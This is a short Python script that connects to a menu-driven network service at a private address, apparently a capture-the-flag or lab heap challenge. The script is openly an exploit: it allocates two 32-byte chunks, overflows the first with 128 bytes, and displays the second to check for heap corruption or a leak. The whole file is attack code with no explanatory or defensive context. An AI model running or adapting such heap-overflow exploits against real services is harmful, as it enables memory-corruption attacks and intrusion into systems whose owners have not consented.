import socket
import time
import struct
import sys

host = "10.2.0.5"
port = 10004


def get_response(s):
    time.sleep(0.5)
    return s.recv(4096).decode(errors="ignore")


def recv_until(s, delim):
    data = b""
    while not data.endswith(delim):
        chunk = s.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    recv_until(s, b"> ")

    # Alloc A
    print("Alloc A")
    s.sendall(b"1\n")
    recv_until(s, b": ")
    s.sendall(b"32\n")
    recv_until(s, b": ")
    s.sendall(b"AAAA\n")
    recv_until(s, b"> ")

    # Alloc B
    print("Alloc B")
    s.sendall(b"2\n")
    recv_until(s, b": ")  # Size
    s.sendall(b"32\n")
    recv_until(s, b": ")  # Name
    s.sendall(b"BBBB\n")
    recv_until(s, b"> ")

    # Write A - Overflow
    print("Writing A (128 A's)")
    s.sendall(b"5\n")
    recv_until(s, b": ")  # Data
    s.sendall(b"A" * 128 + b"\n")
    recv_until(s, b"> ")

    # Show B
    print("Show B")
    s.sendall(b"7\n")
    out = recv_until(s, b"> ").decode(errors="ignore")
    print("Show B output:")
    print(out)

    s.close()


if __name__ == "__main__":
    exploit()
